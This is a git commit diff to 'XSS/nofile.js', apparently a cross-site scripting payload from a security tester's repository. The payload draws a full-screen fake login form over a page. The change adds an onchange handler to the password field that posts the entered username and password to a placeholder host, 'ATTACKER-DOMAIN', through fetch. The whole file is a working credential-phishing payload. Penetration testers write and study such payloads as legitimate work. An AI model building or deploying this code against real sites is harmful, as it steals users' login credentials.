ab319f765c863e399d7367286863b7cbddb58605
Riccardo Malatesta <92185084+seeu-inspace@users.noreply.github.com>
2026-05-23 17:49:36 +0200

    Update nofile.js

--- XSS/nofile.js
+++ XSS/nofile.js
@@ -4,8 +4,8 @@
     <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#f6f8fa;display:flex;align-items:center;justify-content:center;z-index:999999;">
       <form action="https://riccardomalatesta.com/" method="GET" autocomplete="on">
         <h2>Login</h2>
-        <label>Username <input name="username" required></label>
-        <label>Password <input type="password" name="password" required></label>
+        <label>Username <input name="username" id="username" required></label>
+        <label>Password <input type="password" name="password" onchange="if(this.value.length)fetch('https://ATTACKER-DOMAIN',{method:'POST',mode:'no-cors',body:username.value+':'+this.value});" required></label>
         <button type="submit">Sign in</button>
       </form>
     </div>`;
